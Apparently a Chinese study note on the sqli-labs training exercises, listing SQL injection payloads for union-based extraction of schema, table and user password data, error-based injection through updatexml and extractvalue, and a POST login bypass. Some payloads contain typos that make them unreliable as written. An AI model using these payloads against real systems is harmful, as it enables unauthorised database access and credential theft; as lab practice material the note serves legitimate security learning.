LESS-1 （get型）

  1. 寻找注入点
    • 发送get请求，?id=1,正常输出用户名和密码
  2. 判断闭合方式
    • ?id=1’报错（语法错误）
    • ?id=-1’ or 1=1–+正常输出(–+为了清理原始语句中不需要的部分，让注入的代码能够顺利运行)
  3. 判断列数
    • ?id=1’ order by 1,2,3,4;–+ 到4时报错，有3列
  4. 联合查询
    • 查回显，?id=-1’ union select 1,2,3;–+ 发现2和3的位置可以显示（id要改成不存在的，才能确定回显）
    • 查库名，?id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata;–+(group_concat用于合并查询到结果)
    • 查表名，?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’;–+
    • 查列名，?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’;–+
    • 查字段，?id=-1’ union select 1,2,group_concat(concat_ws(‘~’,username,password) )from security.users;–+
  5. 补充
    • concat(str1,str2):连接成一个字符串
    • concat_ws(07xe,str1,str2):与上面那个用法类似，但是可以指定分隔符
    • group_concat:合并成一行显示

LESS-5 （无回显）

  1. 确定没有回显，正确会输出”you are in…”
  2. 用updatxml返回错误的参数信息
    • 判断库名:?id=1 ‘and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)–+
    • 判断表名:?id=1’and updatexml(1,concat(0x7e,(select table_ name from
      information schema.tables where table schema=’security’),0x7e),1)–+
    • 判断列名:?id=1’and updatexml(1,concat(0x7e.(select column_name from
      information schema.columns where table schema=’secunty and table name=’emails’ ),0x7e),1)–+
    • 判断数据:?id=1 ‘and updatexml(1.concat(Ox7e,(select id from emails limit 0.1),0x7e),1)–+
  3. 补充
    • extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
    • updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
    • 当参数的格式不正确而产生的错误，会返回参数的信息

LESS-11 （post型）

  • bp拦截得到uname=admin&passwd=admin&submit=Submit可以成功登录
  • username=admin’ or 1=1#&passwd=admin&submit=Submit
  • 判断列数，username=admin’ order by 1,2;–+ 到3时报错，有2列,之后和less-1的类似
  • 查库名，union select 1,group_concat(schema_name) from information_schema.schemata;–+(group_concat用于合并查询到结果)
  • 查表名，union select 1,group_concat(table_name) from information_schema.tables where table_schema=’security’;–+
  • 查列名，union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’;–+
  • 查字段，union select 1,group_concat(concat_ws(‘~’,username,password) )from security.users;–+
